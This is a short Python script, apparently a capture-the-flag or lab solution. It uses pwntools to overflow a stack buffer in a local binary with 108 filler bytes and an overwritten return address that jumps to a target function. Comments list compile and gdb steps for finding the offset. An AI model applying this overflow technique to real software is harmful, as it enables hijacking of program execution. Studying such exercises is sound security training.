from pwn import *

process = process('./out')
offset = 108
adress = 0x402480

payload = b"A" * offset + p64(adress)  

process.sendline(payload)
output = process.recvall().decode()
print(output)

#g++ -g -o function function.cpp
#gdb ./function
#p readKey

#run $(python -c 'print("A" + 200)')
#x200x $rsp
